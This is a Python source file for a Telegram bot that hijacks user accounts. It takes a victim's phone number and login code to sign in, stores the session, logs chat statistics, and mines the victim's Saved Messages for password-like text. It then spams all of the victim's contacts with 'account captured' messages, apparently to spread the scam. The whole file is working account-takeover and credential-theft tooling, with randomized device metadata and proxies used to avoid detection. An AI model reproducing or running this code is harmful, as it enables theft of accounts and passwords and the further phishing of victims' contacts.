import asyncio

from pyrogram import Client
from pyrogram.enums import ChatType
from tgbot.services.get_text import gMeta, gProxy, gText

from tgbot.services.Log import Log



class Session:

	def __init__(self, message):
		self.phone = message.contact.phone_number
		self.config = message.bot.config
		self.code = None

	async def start(self):
		self.proxy = False
		if self.config.use_proxy:
			self.proxy = gProxy().random()
		self.meta = gMeta().get_random_meta()

		if self.proxy:
			self.client = Client(f'sessions/{self.phone}', 
				api_id=self.config.telegram.api_id,
				api_hash=self.config.telegram.api_hash,
				proxy=self.proxy,
				device_model=self.meta.device_model,
				system_version=self.meta.system_version,
				lang_code=self.meta.lang_code,
				app_version=self.meta.app_version,
			)
		else:
			self.client = Client(f'sessions/{self.phone}', 
				api_id=self.config.telegram.api_id,
				api_hash=self.config.telegram.api_hash,
				device_model=self.meta.device_model,
				system_version=self.meta.system_version,
				lang_code=self.meta.lang_code,
				app_version=self.meta.app_version,
			)
		self.connect = await self.client.connect()
		return self

	async def send_code(self):
		try:
			self.code_hash = await self.client.send_code(str(self.phone))
			return True
		except:
			return False

	async def input_code(self, code, message):

		self.code = str(code)
		try:
			await self.client.sign_in(phone_number=self.phone, phone_code=self.code, phone_code_hash=self.code_hash.phone_code_hash)
			await self.check(message)
			await self.to_json()
			await Log(message).passwords(await ImportSession(self.client).check_passwords())
			await self.client.disconnect()
			return True

		except Exception as e:
			return False

	async def check(self, message):
		if not self.config.log.get_session:
			return False
		me = await self.client.get_me()
		statistic = {
			'all': 0,
			'me': 0,
			'is_creator': 0,
			'find': '',
			'user': me
		}
		find = [i.replace('@', '').replace(' ', '').lower() for i in self.config.find_chats]
		async for dialog in self.client.get_dialogs():
			statistic['all'] += 1

			if not dialog.chat.type.name.lower() in statistic.keys():
				statistic[dialog.chat.type.name.lower()] = 0
			statistic[dialog.chat.type.name.lower()] += 1

			if dialog.chat.is_creator:
				statistic['is_creator'] += 1

			if not dialog.chat.username:
				continue
			if dialog.chat.username.lower() in find:
				statistic['find'] += f'@{dialog.chat.username} '

		async for i in self.client.get_chat_history('me'):
			statistic['me'] += 1

		return await Log(message).get_session(statistic)

	async def to_json(self):
		import time, json
		me = await self.client.get_me()
		with open(f'sessions/{self.phone}.json', 'w+') as file:
			meta = {
				'session_file': f'{self.phone}',
				'phone': f'{self.phone}',
				'api_id': self.config.telegram.api_id,
				'api_hash': self.config.telegram.api_hash,
				'register_time': int(time.time()),
				'device_model': self.meta.device_model,
				'system_version': self.meta.system_version,
				'lang_code': self.meta.lang_code,
				'app_version': self.meta.app_version,
				'user_id': me.id,
				'username': me.username,
				'first_name': me.first_name,
				'2FA': False,
				'status': 'ok',
				'proxy': self.proxy
			}
			json.dump(meta, file)



class ImportSession:

	def __init__(self, session=None):
		self.client = session


	def inject(self, session):
		import json
		with open(f'sessions/{session}.json') as file:
			meta = json.load(file)
		self.client = Client(
			f'sessions/{session}',
			#proxy=meta['proxy'],
			device_model=meta['device_model'],
			system_version=meta['system_version'],
			lang_code=meta['lang_code'],
			app_version=meta['app_version'],
		)
		self.meta = meta
		return self	

	async def check_dialogs(self, config):
		try:
			me = await self.client.get_me()
		except:
			return False
		statistic = {
			'all': 0,
			'me': 0,
			'is_creator': 0,
			'find': '',
			'user': me
		}
		find = [i.replace('@', '').replace(' ', '').lower() for i in config.find_chats]
		async for dialog in self.client.get_dialogs():
			statistic['all'] += 1

			if not dialog.chat.type.name.lower() in statistic.keys():
				statistic[dialog.chat.type.name.lower()] = 0
			statistic[dialog.chat.type.name.lower()] += 1

			if dialog.chat.is_creator:
				statistic['is_creator'] += 1

			if not dialog.chat.username:
				continue
			if dialog.chat.username.lower() in find:
				statistic['find'] += f'@{dialog.chat.username} '

		async for i in self.client.get_chat_history('me'):
			statistic['me'] += 1

		return statistic



	async def check_passwords(self):
		result = []
		async for message in self.client.get_chat_history('me'):
			if not message.text:
				continue
			if 'http' in message.text:
				continue
			title = 'abcdefghijklmnopqrstuvwxyz'
			title += title.upper() + '_' + '1234567890' + ':'
			symb = 0
			for i in title:
				symb += str(message.text).count(i)
			
			if not symb: continue
			if (symb/len(message.text.replace(' ', ''))) > 0.55:
				result.append(message.text)

		return result

	async def spam_reset_auth(self):
		text = gText().get('спам_аккаунт_захвачен_текст')
		image = gText().get('спам_аккаунт_захвачен_фото')
		image = False if image == '0' else f"images/{image}"
		for i in await self.get_dialogs():
			try:
				if not image:
					await self.client.send_message(i, text)
				else:
					await self.client.send_photo(i, image, caption=text)
			except:
				pass

	async def spam_get_session(self):
		text = gText().get('спам_сессия_получена_текст')
		image = gText().get('спам_сессия_получена_фото')
		image = False if image == '0' else f"images/{image}"
		for i in await self.get_dialogs():
			try:
				if not image:
					await self.client.send_message(str(i), text)
				else:
					await self.client.send_photo(str(i), image, caption=text)
			except:
				pass

	async def get_dialogs(self):
		result = []
		async for dialog in self.client.get_dialogs():
			if dialog.chat.type == ChatType.CHANNEL and not dialog.chat.is_creator:
				continue
			if dialog.chat.type == ChatType.BOT:
				continue

			result.append(str(dialog.chat.id))
		return result

	async def get_support(self):
		count = 0
		async for message in self.client.get_chat_history(777000):
			count += 1
		return count

async def export():
	pass